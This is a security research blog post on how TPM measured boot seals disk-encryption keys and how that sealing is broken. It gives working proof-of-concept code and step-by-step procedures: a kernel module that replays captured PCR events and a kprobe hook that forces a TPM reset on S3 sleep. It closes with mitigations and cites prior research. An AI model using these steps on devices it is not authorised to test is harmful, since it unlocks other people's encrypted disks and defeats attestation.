- 2024-02-15
- TPMs Hate Him! (Some Weird Tricks To Break FDE and Bypass Attestation)

These are a series of well-known attacks against TPMs used for attestation and
full-disk-encryption. This article will describe the nature of these attacks
then demonstrate their exploitability in realistic scenarios. Several of
these attacks are often overlooked despite fundamentally undermining the goal
of TPMs for secret storage and attestation.

_This research was done in collaboration with [Máté Kukri](https://github.com/kukrimate)._

## What is a TPM?

A TPM is an abstract device defined by the Trusted Computing Group to act as
a trusted element for building a "Trusted Compute Base" (i.e. an environment
where data can be securely processed). The TCG specification requires a TPM to
provide the following broad-capabilities:
- cryptographic primitives (hashing, signing, encryption)
- randomness generation
- persistent secure data object storage
- system state tracking (via "Platform Configuration Registers")
  + restricting stored object until the system is in a specific state.
  + attestation of the system state to a remote party

In practice, these capabilities are provided to the CPU through an external
TPM chip, referred to as a "dTPM", connected by a hardware bus (e.g. LPC,
I2C, SPI) or emulated by privileged code inaccessible to the operating system
(e.g. ARM TrustZone, Intel ME, AMD PSP), referred to as an "fTPM".

_Note: A key feature of a TPM is that it must resist physical attacks to the
TPM itself._

![TPM BIOS Configuration](assets/bios_tpm.webp)

### Platform Configuration Registers

The TPM provides a bank of Platform Configuration Registers (PCRs) which store
measurements of events.

These events are "measured" by creating a digest of some data to update a PCR.
Crucially, all updates to PCRs are _iterative_ and cannot be overwritten at
runtime, creating a rolling hash (these are called **extensions**).

```
pcr = Hash(pcr | <digest>)
```

Due to the cryptographic security of the hash functions used, a set of PCR
values correspond to an exect sequence of events.

The following is an example set of events taken from a Dell desktop.

> ```
> Event                   Digest                                      PCR (current)
> -----                   ------                                      -------------
> EV_S_CRTM_VERSION       c42fedad268200cb1d15f97841c344e79dae3320    0000000000000000000000000000000000000000
> EV_POST_CODE            f9074b4d4c34dab796dad0b3772a467a28522699    9872964b9b40cdd0363fcd6af8c267c9cb34200b
> EV_EFI_HANDOFF_TABLES   385582ef297021989728c4704a5ea9da0e96fbe3    f18d009df309e04056ec6c3aed2fc51e31546784
> EV_SEPARATOR            d9be6524a5f5047db5866813acf3277892a7a30a    61ce327d6b2c9ea3ab86aae7231fd05325ea81d2
> ----------------------
> PCR (expected)          724911c8c941446ed0727350b671ce84772da73c    724911c8c941446ed0727350b671ce84772da73c
> ```

If any aspect of the events change then the log will derive a different final
PCR value.

### Preventing unauthorised access to secrets

The TPM provides the ability to seal secrets inside the TPM such that the
secrets can only be accessed when a specific authorisation policy is met, these
include:

- **TPM2_PoilcyPCR:** valid if the selected PCR have the desired values.
- **TPM2_PolicySecret:** valid if the knowledge of a secret value is provided.
- **TPM2_PolicyPassword:** valid if the `authValue` of the authorized entity is provided when the session is used for authorisation.
- **TPM2_PolicyCommandCode:** valid when the authorized command has the specified command code.
- **...**

These policies can be combined (AND, OR) to create complex conditions to unlock
secrets. However, in practice, a common policy is `TPM2_PolicyPCR` which seals
an associated object until one or more PCRs have a specific value. Software can
use this by precomputing a set of PCR values corresponding to an expected
sequence of events then sealing a secret inside the TPM against these values.

### Providing Receipts (aka remote attestation)

All TPMs have an embedded certificate, signed by the manufacturer, uniquely
identifying the TPM. The private key associated with the certificate is called
the Endorsement Key. The TPM can provide proof of its existence by providing
its certificate and provide proof of the TPM (i.e. system) state by signing
its PCR bank for remote peers. This allows external parties to verify the state
of the system.

Software can take advantage of this by keeping a log of all measured events
then providing this log alongside the signed PCRs. The external party can
grant various privileges knowing that the responding TPM is in a certain state.

## Measured boot (S-RTM)

An event is anything the software on the CPU wants. In practice, this is often
used to implement "measured boot" which attempts to measure all code and data
within the boot process.

To accomplish this, the immutable bootrom (the first instruction executed by
the CPU) acts as a Root of Trust (i.e. assumed to be secure). This bootrom will
measure the code and data of the following boot stage into relevant PCRs _then_
handoff control. This is repeated until the operating system is fully
initialised.

_Note: the operating system and applications are free to further extend the
PCRs with other events._

As a result, all software running on the CPU has been initially measured into
PCRs on the TPM. Operating systems can combine this with the **Tpm2_PolicyPCR**
to seal Full Disk Encryption (FDE) keys which can only be accessed if the boot
process is unmodified. Alternatively, a remote party can verify that the CPU
is in an environment desired by the remote party.

A common implementation of measured boot is provided by UEFI firmware which
uses the following PCRs:
- PCR0 measures the core system firmware executable
- PCR1 measures the core system firmware data
- PCR2 measures the extended or pluggable firmware code
- PCR3 measures the extended or pluggable firmware data
- PCR4 measures the bootloader and additional drivers
- PCR5 measures the GPT
- PCR6 measures the resume from S4 and S5 power state events
- PCR7 measures the Secure Boot state

Operating systems are free to use the remaining PCRs for any purpose (e.g. PCR8
measures the Linux kernel command line).

## How do we _actually_ implement measured boot?

The CPU is able to issue commands to the TPM over its attached interface. The
commands are defined by Part 3 of the TCG Trusted Platform Module Library,
notable functions include:
- `TPM2_Startup`: transition TPM from the Iniitalization state to an Operational state (optionally restoring previous state).
- `TPM2_Shutdown`: prepare the TPM for loss of power (optionally preserve the Operational state).
- `TPM2_StartAuthSession`: establish a secure channel with the TPM.
- `TPM2_PCR_Extend`: extend a specific PCR using a specificed algorithm with a digest.
- `TPM2_PCR_Read`: obtain a list of PCR values.
- `TPM2_PCR_SetAuthPolicy`: associate a policy with a PCR to dictate how it can change.
- `TPM2_PCR_SetAuthValue`: associate an authorization value with a PCR.
- `TPM2_Unseal`: unseal a data object with an associated authorization policy.
- `TPM2_Certify`: prove that an object with a specific name is in the TPM.
- `TPM2_Quote`: obtain a signed list of hashed PCR values.

As mentioned earlier, the act of sealing data prevents that data object from
being read until a specific condition is met. This condition is specified in
`TPM2_CreatePrimary`. The `TPM2_StartAuthSession` can create a secure channel
preventing a passive attacker from snooping on transactions and an active
attacker from MITM-ing connections.

With a subset of these commands, a CPU can perform measured boot then unseal a
key if the state of firmware is expected. The initial setup involves:
0. creating the authenticated session if using one
1. creating the data object containing the key
2. creating an authorization policy
3. associating an authorization policy with a PCR2 value (sealing the key)

Then the CPU can interact with the TPM as follows:

> ```rs
> // Transition the TPM then create an encrypted session before communicating.
> tpm2_startup(CLEAR)?;
> let mut session = tpm2_start_auth_session(tpmkey, authvalue, SIMPLE_HMAC, ...)?;
>
> // Measure each firmware module before its dispatched to create immutable log.
> for module in firmwares.iter() {
>     tpm2_pcr_extend(&mut session, PCR2, module.digest())?;
> }
>
> debug!("PCR2: {}", tpm2_pcr_read(&mut session, PCR2));
>
> // Dispatch all the modules!
> for module in firmwares.into_iter() {
>     module.launch()?;
> }
>
> // The encryption key is only available when PCR2 is a specific value.
> let key = tpm2_unseal(&mut session, FDE_KEY)?;
> ```

If an attacker were to modify any boot code then the PCR values will not match,
and the disk will not decrypt. Consequently, the disk is only decryptable to
an untempered copy of the operating system, which can then further authenticate
the user (e.g. via a login prompt). This is how most TPM-aware FDE
implementations broadly work (e.g. BitLocker, systemd-cryptenroll, Ubuntu TPM FDE, etc.)

## Snoop FDE key using passive probe

A very well documented and demonstrated attack is to use a logic analyser to
snoop on the communications between the CPU and a dTPM via the hardware bus.

Instead of reinventing the wheel, we'll leave a link to a video instead.

<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/wTl4vEednkQ?si=bMcp7YTGzAhi8seX" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

## Unseal FDE key using hardware reset

The TPM specification assumes that Trusted Building Blocks (TBBs) used to
connected components (e.g. LPC bus) will not act maliciously. However, this is
not true in practice because an attacker can externally manipulate a dTPM via
the LPC bus.

We originally believed this attack was a novel idea, but later discovered prior
descriptions of similar attacks. We believe this was first published by Dartmouth
University in 2007.

### How does the TPM interact with LPC?

The Low Pin Count (LPC) bus is a holdover from the ISA bus which attaches
low-speed peripherals. The bus consists of (at least) 7 signals:

- `LCLK`: 33MHz clock (same as PCICLK).
- `LRESET#`: Active-low bus reset (same as PCI Reset).
- `LFRAME#`: Active-low indication of a new transaction.
- `LAD[3:0]`: Multiplexed command, address, and data.

When the system is powered on, the `LRESET#` signal is pulled high to begin the
TPM startup sequence, illustrated below.

![TPM Startup Sequences](assets/tpm_startup_seq.webp)

The TPM will receive a `TPM_Startup` command from the CPU which attempts to
start the TPM with a volatile blank state or restore to its state prior to
an orderly shutdown. An orderly shutdown is a when the CPU issues a
`TPM_Shutdown` command before the TPM loses power (e.g. hard reset or ACPI
sleep state). However, it is always possible for the TPM to lose power which
is called a "TPM Reset", defined below.

> **TPM Reset** is a `Startup(CLEAR)` that follows a `Shutdown(CLEAR)`, or a
> `Startup(CLEAR)` for which there was no preceding `Shutdown()` (that is, a
> disorderly shutdown). A TPM Reset is roughly analogous to a reboot of a
> platform. As with a reboot, most values are placed in a default initial
> state, but persistent values are retained. Any value that is not required by
> this specification to be kept in NV memory is reinitialized. In some cases,
> this means that values are cleared, in others it means that new random values
> are selected.

### How can we trigger a reset?

Consequently, if an attacker can reset the TPM, the TPM will contain a blank
volatile state (i.e. reset all PCRs). We will demonstrate this by targeting
a Dell Optiplex with physical access to the motherboard. This scenario is
realistic in the context of a hacker with prolonged access to a FDE encrypted
device.

Looking at the board we see the following.

![Dell Optiplex Motherboard](assets/dell_motherboard.webp)

We can see a dTPM with a nearby LPC debug header (attached to the PCH). If
we want to reset the dTPM, we can either cut the power trace to the chip or
short `LRESET#` to ground (which is active-low).
Luckily, on the Optiplex motherboard `LRESET#` is exposed on the LPC debug
header so we can easily short`LRESET#` to ground but directly shorting these
pins on the TPM package is also possible.

Shorting `LRESET#` to ground may reset other peripherals connected to
the LPC bus (or another bus sharing the same reset signal). On most Intel
motherboards, the Super I/O chip (containing legacy peripherals like UART,
LPT, etc.) is the only peripheral sharing the reset signal so the reset doesn't
cause any issues.

However, attempting to short `LRESET#` to ground on our AMD motherboard caused
the processor to reset, preventing the easy exploit. Despite this, cutting the
`VCC` or `LRESET#` trace (easily done on modular TPM add-on cards),
or desoldering the TPM is viable.

### How do we leak a sealed key?

The object (key) will be sealed behind a specific PCR value. We can obtain the
TPM event log for a normal boot of the target using `tpmtool` on Windows or via
sysfs on Linux. This may seem contrived but many devices are preconfigured by the
manufacturer so the event log between devices are identical (aside from
software/firmware update mismatches).

```
C:\> tpmtool gatherlogs C:\Users\User\Desktop\logs
C:\> tpmtool parsetcglogs > C:\Users\User\Desktop\logs\tcg.txt

$ cp /sys/kernel/security/tpm0/binary_bios_measurements log.bin
```

Then we write a small utility that will reconfigure the TPM with the captured
event log to arrive at a target state (unsealing the key).

> ```c
> struct event {
>     u32 pcr;
>     struct tpm_digest digest;
> };
>
> /* lord forgive me for what i'm about to do */
> static struct event event_log[] = {
> #include "tpm-event-log"
> };
>
> static int __init tpm_reconf_init(void) {
>     for (struct event *evt = event_log; evt->pcr != 99; evt++) {
>         pr_info("measuring event: (pcr %d) %x%x%x%x...", evt->pcr,
>                 evt->digest.digest[0], evt->digest.digest[1],
>                 evt->digest.digest[2], evt->digest.digest[3]);
>         tpm_pcr_extend(NULL, evt->pcr, &evt->digest);
>     }
>     return 0;
> }
> ```

_Note: another solution is to use the Linux utility `tpm2_pcrextend`._

### Putting it together

1. boot into a USB live image
2. reset the TPM by briefly by disconnecting the TPM from power
   (or by shorting LPC `LRESET#` to ground)
3. restart the TPM with `TPM_Startup(CLEAR)`
4. replay the gathered event log to configure the TPM with the required PCR values to unseal the FDE key

<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/oY7tCZH2w60?si=QBAFVRhtahTPjRBa" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

## Unseal FDE key using Software Reset

Similarly to the hardware reset, we have also initially believed this attack to
be novel, but it was previously published by the National Security Research Institute
in the 2018 paper "A Bad Dream".

The trick here is to trigger a reset by entering an ACPI sleep state which
removes power from components and peripherals. ACPI defines multiple sleep
states, one of which we are interested:
- S0: Normal execution.
- S1: Low wake-latency sleep state (only CPU caches are flushed).
- S2: Low wake-latency sleep state (all context except memory can be lost).
- S3: Low wake-latency sleep state (all peripherals except DRAM are powered off).
- S4: Longest wake-latency sleep state (all peripherals are powered off).
- S5: Logical turn-off (for all intents and purposes, similar to hard reset).

Although S3-S5 power off all peripherals (S2 is unused), S3 will resume from
memory using an S3 boot script. Whereas S4-S5 will essentially require a full
reboot so all cleared PCRs will be measured by firmware. Therefore, we are only
interested in S3 since the boot script does not remeasure into the TPM.

An additional benefit of ACPI sleep versus hardware resets is that this attack
can be applied to (unpatched) fTPMs or dTPMs entirely in software! This allows
an attacker to fully compromise insecure FDE configurations with just external
access.

### Exploitation

Exploitation is similar to the hardware reset but we trigger an ACPI sleep to
power off the TPM while preventing the kernel from preserving the TPM state via
`TPM_Shutdown(STATE)`. When the system resumes, the TPM will have a blank
state which we can extend with recorded values to unseal the VMK.

To prevent the kernel from preserving the TPM state, we hook the kernel
[functions](https://elixir.bootlin.com/linux/v6.7.4/source/drivers/char/tpm/tpm2-cmd.c#L429) responsible for dispatching those commands with an LKM.

> ```c
> #ifndef CONFIG_X86
> #error "This module is only supported for AMD64 platforms."
> #endif
>
> static int __kprobes tpm2_shutdown_hook(struct kprobe *p, struct pt_regs *regs) {
>     u64 retaddr = *(u64 *)regs->sp;
>     if (regs->si == TPM2_SU_STATE) {
>         pr_info("preventing %pS from preserving TPM state\n", (void *)retaddr);
>         regs->si = TPM2_SU_CLEAR; /* replace SU_STATE with SU_CLEAR */
>     }
>     return 0;
> }
>
> static struct kprobe kp = {
>     .symbol_name = "tpm2_shutdown",
>     .pre_handler = tpm2_shutdown_hook,
> };
>
> static int __init tpm_acpi_reset_init(void) {
>     if (register_kprobe(&kp) < 0) {
>         pr_err("cannot create kprobe\n");
>         return -EINVAL;
>     }
>     pr_info("successfully installed hook for %pS\n", kp.addr);
>     return 0;
> }
>
> static void __exit tpm_acpi_reset_exit(void) {
>     unregister_kprobe(&kp);
>     pr_info("removed hook for %pS\n", kp.addr);
> }
> ```

There are behavioural differences between Intel and AMD chipset generations
which limits the extensiveness of our testing. However, we did do some testing
on different setups.

#### Intel i3-6100 (6th gen)

Using the system below, the **dTPM and fTPM** were cleared upon wakeup from S3.

![i3-6100 Asus Motherboard](assets/asus_tpm_mobo.webp)

#### Intel i5-13600K (13th gen) with fTPM

The 13th generation Intel processor exhibits interesting behaviour. When the
system enters S3 sleep with `TPM_Shutdown(CLEAR)`, PCR1-7 are filled with
marker values. These values were _not measured into the TPM during the regular
boot procedure_ so we believe this to be a mitigation.

> ```
> root@z790-gentoo:~ # insmod tpm-acpi.ko
> root@z790-gentoo:~ # grep '' /sys/class/tpm/tpm0/pcr-sha256/*
> /sys/class/tpm/tpm0/pcr-sha256/0:68E56416B39BCA749EF9438E66C65253DD1954690E4DD67C57563C1AF9EAC785
> /sys/class/tpm/tpm0/pcr-sha256/1:4C77C3FEB49AC00615CEC0BC5BCEF7C380921408285EEEBF78C54FD1FBD47D13
> /sys/class/tpm/tpm0/pcr-sha256/2:1FAFEC725C830A3C16CF549DA9EFB21F1633CB38B3434CB9253E89428EA4E8C6
> /sys/class/tpm/tpm0/pcr-sha256/3:3D458CFE55CC03EA1F443F1562BEEC8DF51C75E14A9FCF9A7234A13F198E7969
> /sys/class/tpm/tpm0/pcr-sha256/4:C5442EB33F39AF4D639AD71554894804BA549AC71ACE7D0D859183C99407AC8A
> /sys/class/tpm/tpm0/pcr-sha256/5:04CB856C090DEA26AB3936D3E27C158AE95C60F10CF4C186919DB0D28384D319
> /sys/class/tpm/tpm0/pcr-sha256/6:3D458CFE55CC03EA1F443F1562BEEC8DF51C75E14A9FCF9A7234A13F198E7969
> /sys/class/tpm/tpm0/pcr-sha256/7:797A432D8915E48B4D0942508F6033C2186BB852DC71273DADBFF95EBCCEEBA3
> /sys/class/tpm/tpm0/pcr-sha256/8:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/9:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/10:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/11:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/12:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/13:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/14:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/15:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/16:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/17:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
> /sys/class/tpm/tpm0/pcr-sha256/18:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
> /sys/class/tpm/tpm0/pcr-sha256/19:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
> /sys/class/tpm/tpm0/pcr-sha256/20:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
> /sys/class/tpm/tpm0/pcr-sha256/21:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
> /sys/class/tpm/tpm0/pcr-sha256/22:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
> /sys/class/tpm/tpm0/pcr-sha256/23:0000000000000000000000000000000000000000000000000000000000000000
> root@z790-gentoo:~/tpmfck # rtcwake -m mem -s 2
> rtcwake: assuming RTC uses UTC ...
> rtcwake: wakeup from "mem" using /dev/rtc0 at Mon Feb 12 21:56:12 2024
> root@z790-gentoo:~/tpmfck #
> root@z790-gentoo:~/tpmfck # grep '' /sys/class/tpm/tpm0/pcr-sha256/*
> /sys/class/tpm/tpm0/pcr-sha256/0:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/1:486B106959E77E23F464FB8F443B36D47C32D396C08591C634FE92847C5B65C9
> /sys/class/tpm/tpm0/pcr-sha256/2:486B106959E77E23F464FB8F443B36D47C32D396C08591C634FE92847C5B65C9
> /sys/class/tpm/tpm0/pcr-sha256/3:486B106959E77E23F464FB8F443B36D47C32D396C08591C634FE92847C5B65C9
> /sys/class/tpm/tpm0/pcr-sha256/4:486B106959E77E23F464FB8F443B36D47C32D396C08591C634FE92847C5B65C9
> /sys/class/tpm/tpm0/pcr-sha256/5:486B106959E77E23F464FB8F443B36D47C32D396C08591C634FE92847C5B65C9
> /sys/class/tpm/tpm0/pcr-sha256/6:486B106959E77E23F464FB8F443B36D47C32D396C08591C634FE92847C5B65C9
> /sys/class/tpm/tpm0/pcr-sha256/7:486B106959E77E23F464FB8F443B36D47C32D396C08591C634FE92847C5B65C9
> /sys/class/tpm/tpm0/pcr-sha256/8:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/9:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/10:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/11:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/12:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/13:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/14:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/15:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/16:0000000000000000000000000000000000000000000000000000000000000000
> /sys/class/tpm/tpm0/pcr-sha256/17:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
> /sys/class/tpm/tpm0/pcr-sha256/18:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
> /sys/class/tpm/tpm0/pcr-sha256/19:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
> /sys/class/tpm/tpm0/pcr-sha256/20:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
> /sys/class/tpm/tpm0/pcr-sha256/21:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
> /sys/class/tpm/tpm0/pcr-sha256/22:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
> /sys/class/tpm/tpm0/pcr-sha256/23:0000000000000000000000000000000000000000000000000000000000000000
> ```

However, you can notice that PCR0 and PCR8-16 are cleared. Despite an attacker
being able to reset these values to affect application PCRs, all default FDE
seals against the modified PCRs. We are not entirely sure why only PCR1-7 are
extended instead of PCR0-7 (or all PCRs) but maybe someone else knows :)

_Note: We were not able to test with a dTPM so the behaviour may be different._

_Note: this is likely due to early boot software detecting a disorderly shutdown
so perhaps it can be tricked?_

#### AMD systems

We have tested this both an a AMD Ryzen 7 2700 (Zen+) and AMD Ryzen 9 3950X (Zen 2).

In this scenario, the dTPM has the _exact same_ PCR state as the 13th
generation Intel fTPM (including the blank PCR0). We believe this is done similarly
by early boot software detecting a disorderly shutdown then marking the TPM.
A way to validate this is to inspect the hardware bus to see what is being measured.

Unlike the dTPM, the fTPM completely preserves its state through a disorderly
shutdown. Consequently, the PCRs cannot be cleared via S3. This behaviour
differs from the TPM specification so bugs might exist when the fTPM is reset
(see page 20 of the TCG TPM2 Specification Part 3).

### Putting it together

1. boot into USB live image
2. install kernel module to hook kernel
3. briefly enter S3 sleep via `systemctl suspend`
4. restart the TPM with `TPM_Startup(CLEAR)`
5. groom the TPM with recorded PCR values to unseal FDE key

<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/59wxJo80NMU?si=GgdSQ5r0M0gh3xSl" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

## Encrypted Parameters

Encrypted parameters create a secure channel between CPU and dTPM device
by encrypting the parameters area of the command and response buffers.

Sessions can be established using both symmetric and asymetric keys stored
inside the TPM.

Initially the CPU establishes a session using the TPM's manufacturer provided EK,
and verifies its legitimacy using PKI to ensure it is communicating with the TPM
instead of a man-in-the-middle attacker.
Then CPU side can use the initial asymetric session to provision a symmetric
session key inside the TPM which it can store for faster communication after
the disk is unlocked.

This can be used to initially provision then unlock FDE protected disks in
a fashion resistent to both passive and MITM attackers on the TPM bus.

However, our attack still breaks such schemes, as software running on the CPU
can simply establish its own channel with the TPM and unseal the encryption key
directly (after the PCR values were changed).

## Conclusion

In this article we have shown:
- with outdated firmware, we can defeat both fTPM and dTPM based FDE via a purely software based attack
- with up-to date firmware, we can defeat dTPM based FDE using a simple hardware attack

As a consequence, discrete TPMs (dTPMs) **cannot be relied upon in any scenario
to accurately reflect system state**. This defeats dTPM provided remote attestation,
and unattended unlock FDE schemes.

The only realistic mitigation against the dTPM hardware attack is to include
interactive user provided secrets such as a PIN or passphrase as part of FDE
key sealing policy, reducing dTPMs in practice to a dictionary attack resistant
PIN lock-box, and rather slow cryptographic coprocessor sitting on an even slower
bus.

The alternative to dTPMs are firmware TPMs (fTPMs) which offer significantly better
physical security (against these attacks) by being on the CPU itself.
fTPMs by nature, prevent hardware snooping and cannot be reset by hardware without
resetting the CPU. Although past vulnerabilities have been discolsed in such designs
(e.g.faulTPM: Exposing AMD fTPMs' Deepest Secrets).

When configuring FDE, especially when using dTPMs, always use an **interactive pin/password**.
Additionally, implementors could include a per-install value to measure into the TPM during
boot. This value would prevent an attacker from using a log of a similar
machine without extracting the value.

In closing, a security component tied to the state of a processor but external
to the processor is fundamentally broken by design.

### Bonus Notes

Thank you to [Matti](https://github.com/Mattiwatti) for letting me (ab)use your
Intel machine.

While experimenting with TPMs, we discovered that for some Asus firmware, the
firmware does not not measure into _any_ of the PCRs despite "supporting" the TCG
protocol. Consequently, all values are sealed against blank PCRs, regardless
of system configuration.

## References & Related Work
- [TPM 2.0 Library](https://trustedcomputinggroup.org/resource/tpm-library-specification/)
- [Intel® Low Pin Count (LPC)](https://www.intel.com/content/dam/www/program/design/us/en/documents/low-pin-count-interface-specification.pdf)
- [ACPI Specification Version 6.5](https://uefi.org/specifications)
- [A Security Assessment of Trusted Platforms Modules](https://core.ac.uk/download/pdf/337600893.pdf)
- [A Bad Dream: Subverting Trusted Platform Module While You Are Sleeping](https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-han.pdf)
- [faulTPM: Exposing AMD fTPMs' Deepest Secrets](https://arxiv.org/abs/2304.14717)
